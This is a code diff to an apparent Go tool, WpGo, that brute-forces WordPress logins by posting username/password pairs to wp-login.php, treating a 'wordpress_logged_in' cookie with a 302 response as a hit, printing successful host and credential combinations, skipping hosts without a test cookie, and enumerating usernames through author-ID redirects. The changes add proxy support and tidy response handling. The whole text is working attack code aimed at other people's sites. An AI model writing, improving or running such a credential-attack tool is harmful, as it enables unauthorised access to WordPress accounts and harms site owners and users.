@@ -14,6 +14,7 @@ var Success = make(map[string]bool)
 var BlackList = make(map[string]bool)
 var sLock sync.Mutex
 var bLock sync.Mutex
+var Proxy string
 
 type WpGo struct {
 	http Ghttp.Http
@@ -40,7 +41,7 @@ func (w *WpGo) Login(siteTask SiteTask) {
 		//log.Println("IsBlack ", siteTask)
 		return
 	}
-	//log.Println(siteTask)
+	log.Println(siteTask)
 	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
 	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
 	w.http.New("POST", uri)
@@ -50,10 +51,15 @@ func (w *WpGo) Login(siteTask SiteTask) {
 	}
 	w.http.SetContentType("application/x-www-form-urlencoded")
 	w.http.SetPostString(postData)
-	//w.http.SetProxy("http://127.0.0.1:8080")
+	if Proxy != "" {
+		w.http.SetProxy(Proxy)
+	}
 	w.http.Execute()
+	w.http.Byte()
 	cookie := w.http.RespCookie()
-	if strings.Contains(cookie, "wordpress_logged_in") {
+	//log.Println(cookie)
+	//log.Println(w.http.StatusCode())
+	if strings.Contains(cookie, "wordpress_logged_in") && w.http.StatusCode() == 302 {
 		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
 		w.SetSuccess(key)
 		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
@@ -75,9 +81,7 @@ func (w *WpGo) GetBlack(key string) bool {
 	return BlackList[key]
 }
 func (w *WpGo) SetBlack(key string, t bool) {
-
 	sLock.Lock()
-	//log.Println("GetBlack ", key, t)
 	BlackList[key] = t
 	sLock.Unlock()
 }
@@ -98,17 +102,17 @@ func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
 	}
 	w.http.SetContentType("application/x-www-form-urlencoded")
 	w.http.SetPostString(postData)
-	//w.http.SetProxy("http://127.0.0.1:8080")
+	if Proxy != "" {
+		w.http.SetProxy(Proxy)
+	}
 	w.http.Execute()
 	cookie := w.http.RespCookie()
+	w.http.Byte()
 	if strings.Contains(cookie, "wordpress_test_cookie") == false {
-		//w.BlackList[siteTask.Host] = true
-		//log.Println("cookie: ", cookie)
 		w.SetBlack(siteTask.Host, true)
 		return true
 	}
 	w.SetBlack(siteTask.Host, false)
-	//w.BlackList[siteTask.Host] = false
 	return false
 
 }
@@ -123,13 +127,13 @@ func (w *WpGo) GetUser(host string, id int) string {
 		return ""
 	}
 	if w.http.StatusCode() != 301 && w.http.StatusCode() != 302 && w.http.StatusCode() != 200 {
+		w.http.HttpResponse.Body.Close()
 		return ""
 	}
 	location := w.http.HttpResponse.Header.Get("location")
-	//var userText string
-	//log.Println(location)
 	//通过301获取用户名
 	if location != "" {
+		w.http.HttpResponse.Body.Close()
 		return w.getUser(location)
 	}
 	//通过页面返回获取用户名
@@ -145,7 +149,6 @@ func (w *WpGo) getUser(userText string) string {
 			//log.Println(username[0])
 			return username[0]
 		}
-		//log.Println(user[1])
 		return user[1]
 	}
 	return ""
